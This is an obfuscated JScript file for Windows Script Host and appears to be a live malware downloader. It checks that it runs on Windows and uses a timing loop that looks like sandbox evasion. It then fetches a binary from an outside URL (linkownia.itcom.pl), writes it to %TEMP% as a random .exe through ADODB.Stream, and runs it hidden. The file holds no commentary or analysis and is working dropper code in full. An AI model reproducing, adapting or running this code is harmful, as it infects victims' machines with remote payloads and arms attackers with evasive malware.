var _SO = false;
var _T = "CreateObject";
var _J0 = function _U() {return WScript[_T]("WScript"+".Shell");}(), _CB0 = 11;
var _CK = "MSXML2.XMLHTTP";
var _O = 2123213;
var _X = 0;
function _I(_G){_J0["Run"](_G, _X, _X);};
function _BU(){return _CK + "";};
function _CS(_DA, _O1){_X = _X * 1; return _DA - _O1;};
function _BY(){return _T;};
/*@cc_on
  @if (@_win32 || @_win64)
    _SO = true;
  @end
@*/
if (_SO)
{
var _P = "";
function _H(){return 22;};
var _QA = 0; var _O0 = 0;
function _UP()
{
var _B = new this["Date"]();
var _A = _B["getUTCMilliseconds"]();
WScript["Sleep"](_H());
var _B = new this["Date"]();
var _J = _B["getUTCMilliseconds"]();
WScript["Sleep"](_H());
var _B = new this["Date"]();
var _IC = _B["getUTCMilliseconds"]();
var _QA = "_CB";
_QA = _CS(_J, _A);
var _O0 = "_Z";
_O0 = _CS(_IC, _J);
_P = "open";
return _CS(_QA, _O0);
}
var _QH = false;
var _SS = false;
for (var _Z0 = _X; _Z0 < _H() * 1; _Z0++){if (_UP() != _X){
_QH = true; 
_O0 = "31" + 11 * _QA + _O0; 
_SS = true; 
break;
}}
function _S() {return ((_QH == true) && (_QH == _SS)) ? 1 : _X;};
if (_QH && _S() && _SS){
function _K() {return _J0["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "7Grx4Wi5y0xi3xDz.ex" + "e";};
 _VE = _BU();
 _F = WScript[_T](_VE);
 var _AE = 1;
 while (_AE){
try {
	if (_AE == 1)
	{
		_F[_P]("GET", "http://linkownia.itcom.pl/s9aps", false);
		_F["send"]();
		_U0 = "Sleep";
	}
	WScript[_U0](_H() + 120); 
	if (_F["readystate"] < 2 * 2) continue;
	_AE = _X;
	function _NX(_DC) {var _NP = (1, 2, 3, 4, 5, _DC); return _NP;};
	_M0 = WScript[_BY()]("ADODB.Stream");
	_VE = _M0;
	_VE[_P]();
	_VE["type"] = _NX(1);
	_VE["write"](_F["ResponseBody"]);
	_M0["position"] = _NX(_X);
	_VE["Save" + "ToFile"](_K(), 2);
	_M0["cl"+"ose"]();
	_M = _K();
	_I(_M);
} catch(_TX){};
}
}
}

